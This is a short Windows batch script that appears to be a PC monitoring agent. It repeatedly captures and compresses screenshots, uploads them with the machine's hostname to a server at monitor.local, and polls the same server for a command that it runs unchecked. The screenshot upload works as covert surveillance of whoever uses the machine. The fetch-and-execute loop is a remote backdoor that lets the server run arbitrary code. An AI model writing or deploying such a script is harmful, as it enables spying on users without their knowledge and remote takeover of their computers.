rem main.bat
set /p yesterday=<date
echo %date% > today
set /p today=<today
if NOT "%yesterday%" == "%today%" (
echo %date% > date
del *.jpg
) 

nircmd.exe savescreenshot test.jpg
set interval=60000
hostname > c:/host.txt
set /p USER=<c:/host.txt
set form="pc=%USER%"
:loop
FOR /F %%i IN ('dir *jpg /b /O-D') DO (
    SET file=%%i
    GOTO send
)
:send

curl -F "data=@%file%" -F %form% http://monitor.local/api/photo
set fn=%random%.jpg
nircmd.exe cmdwait %interval% savescreenshot %fn%
magick.exe mogrify -resize 1366x768 -format jpg -quality 10 %fn%
curl http://monitor.local/api/status > status
set /p status=<status
IF "%status%"=="%USER%" (set interval=10000) ELSE (set interval=60000)

curl http://monitor.local/api/getCommand/1 > temp.txt
set /p CMD=< temp.txt
%CMD%

goto loop